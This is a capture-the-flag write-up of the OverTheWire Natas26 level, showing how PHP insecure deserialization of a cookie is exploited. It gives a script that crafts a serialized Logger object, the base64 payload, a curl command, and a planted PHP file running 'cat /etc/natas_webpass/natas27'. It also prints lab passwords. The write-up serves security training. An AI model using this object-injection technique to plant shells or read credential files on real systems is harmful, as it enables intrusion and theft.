---
category: natas
title: Natas26 - Insecure Deserialization
---

website: http://natas26.natas.labs.overthewire.org/ (password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T)

This is the most challenging question I have seen in NATAS so far.
In this challenge, it draws an image based on users' input.
User can also view this image via a URL.
I didn't see any logic issue in this challenge, but I did notice that the source code has a class `Logger` that is never used in this application.

After I did some research, I found this article on the OWASP Top 10:
<a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Insecure Deserialization</a>.
In this article, it explains how a hacker could exploit this vulnerability and inject malicious codes.

Going back to Natas26 itself, I noticed that it also deserializes an object from the cookie:
```php
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

This gives me a hint to send the server a drafted cookie that contains a serialized object,
and the serialized object contains some malicious code.
Which object are we going to use?
Obviously an object of `Logger` because the server knows it! See below:

```php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
   
    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";
... <skipped>
```

Now all what I need is to do the reverse of `unserialize(base64_decode($_COOKIE["drawing"]))` on the client side:
- `base64_encode(serialize($obj))`.

Here, `$obj` is an instance of class `Logger`.
Moreover, I will provide the properties with following values:
- Provide `$logFile` with a php file name, e.g., <small>/var/www/natas/natas26/img/mylog.php</small>.
- Provide `$exitMsg` with php code `<?php passthru('cat /etc/natas_webpass/natas27'); ?>`. 

Regarding how it works, the key point here is the line `$drawing=unserialize(base64_decode($_COOKIE["drawing"]));`:
Once an HTTP request's cookie contains a "drawing" parameter,
the server will consider this parameter as a serialized object
and try to restore that object by deserializing it.
Any object has its life cycle.
Once an object is end of life, the destructor will be called and thus the `$exitMsg` will be written into the `$logFile`, which is a php file.

To help you better understand the idea, here are my steps to solve this challenge:

<strong>Step 1.</strong>
Came up with a php script on the client side.
The script defines a variant of class `Logger` and creates a serialized `Logger` object.
The properties' names are the same with the ones on the server side,
but their values are different from the server side. See below:

```php
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        $this->initMsg="hello miaxu\n";
        $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/mylog.php";
    }
}

$o = new Logger();
//print_r($o);
echo urlencode(base64_encode(serialize($o)))."\n";

?>
```

<strong>Step 2.</strong>
Naming the above PHP script as natas26.php.
Running it on the client side. That will give you a serialized `Logger` object:
```shell
$ php natas26.php
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbXlsb2cucGhwIjtzOjE1OiIATG9nZ2VyAGlu
aXRNc2ciO3M6MTI6ImhlbGxvIG1pYXh1CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUzOiI8P3BocCBwYXNzdGhydSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRh
czI3Jyk7ID8%2BCiI7fQ%3D%3D
```

<strong>Step 3.</strong>
Running a curl command to send a request with the object that we just created
(I skipped the full string due to the page limitation,
please do copy the full string in step 2 if you want to test my solution):
```shell
curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T  "http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=2&y2=2" \
     --cookie "drawing=Tzo2OiJMb2dnZXIi..."
```

<strong>Step 4.</strong>
You will see an error in the response returned by the server:
```html
<img src="img/natas26_ngv6psfcumtah7demlq7139955.png"><br />
<b>Fatal error</b>:  Cannot use object of type Logger as array in <b>/var/www/natas/natas26/index.php</b> on line <b>105</b><br />
```
You see the error because the server cannot deserialize the object as an array of X/Y axies
(which makes sense because it's our hand crafted object with malicious code).
That's okay. We don't care about the error.
All what we care about is that a php file was created on the server under this path:
"/var/www/natas/natas26/img/mylog.php".
There is only one line in this php file: `<?php passthru('cat /etc/natas_webpass/natas27'); ?>`

<strong>Step 5.</strong>
The above php file is accessible via the URL "http://natas26.natas.labs.overthewire.org/img/mylog.php".
Visiting that page will run the malicious PHP code and show natas27's password: <small>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</small>.



<strong>References</strong>

This challenge is about the security risk of Insecure Deserialization, which is listed as one of OWASP Top 10.
Please refer to this article for more details:
- <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Insecure Deserialization</a>.
